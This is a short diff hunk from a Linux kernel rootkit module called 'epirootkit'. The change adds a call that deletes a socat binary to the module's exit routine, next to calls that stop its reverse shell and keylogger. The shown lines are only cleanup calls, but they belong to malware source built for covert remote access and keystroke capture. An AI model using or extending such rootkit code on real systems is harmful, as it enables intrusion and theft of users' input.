@@ -72,6 +72,7 @@ static int __init epirootkit_init(void){
  */
 static void __exit epirootkit_exit(void){
 	stop_reverse_shell();
+	remove_socat_binaire();
 
 	// stop keylogger
 	epikeylog_exit();
